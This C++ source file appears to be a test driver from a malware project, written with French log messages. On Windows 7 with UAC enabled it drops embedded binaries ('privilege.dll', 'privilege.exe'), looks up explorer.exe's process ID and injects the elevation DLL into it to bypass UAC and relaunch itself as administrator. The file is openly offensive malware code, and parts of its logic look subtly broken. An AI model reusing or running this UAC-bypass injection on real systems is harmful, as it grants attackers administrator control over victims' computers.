#include <common/Logger.hpp>
#include <malicious/BinaryRessource.hpp>
#include <system/ThisProcess.hpp>
#include <system/System.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
#include <system/File.hpp>
#include <system/Uac.hpp>
using namespace System;
using namespace Malicious;

#include <string>
using namespace std;

// DLL de privilege escalation
#include <ElevatorDll64.hpp>
// Programme de privilege escalation
#include <Elevator64.hpp>

int main(int argc, char * argv[])
{
	try
	{
        LOG.setHeader("TEST ELEVATION");
        LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
        switch(getSystemVersion())
	    {
		    case OS_WIN32_WINDOWS_VISTA:
			    if(isUacActivated())
			    {
				    if(!isAdministrator())
				    {
					    LOG << "Elevation non supportee sur Windows Vista.";
				    }
			    }
			    break;
		    case OS_WIN32_WINDOWS_SEVEN:
			    if(isUacActivated())
			    {
				    if(!isAdministrator())
				    {
					    LOG << "Vous n'etes pas administrateur. Tentative d'elevation.";
    					const char * ELEVATOR_PROCESS_NAME = "explorer.exe";
                        const char * ELEVATOR_DLL_NAME = "privilege.dll";
                        const char * ELEVATOR_EXE_NAME = "privilege.exe";
					    BinaryRessource elevatorDll(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
					    BinaryRessource elevator(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
    					
					    LOG << "Decouverte du PID d'explorer.exe";
					    DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
					    if(explorer_pid)
					    {
						    LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
					    }
					    else
					    {
						    FATAL_ERROR("explorer.exe ne peut pas etre injecte. Le processus n'existe pas.");
					    }
    					
                        ThisProcess thisProcess;
                        string currentPath = thisProcess.getArg(0);
                        System::GetFileDir(currentPath);
                        string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getArg(0);
					    LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
    					
					    Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
					    elevatorProcess.wait();				
				    }
			    }
		    default:
			    LOG << "Vous etes administrateur!";
        }
    }
    catch(std::exception& e)
    {
        LOG << "Exception standard : " + to_string(e.what());
    }
	catch(...)
	{
		LOG << "Erreur d'origine inconnue.";
	}
	return EXIT_SUCCESS;
}
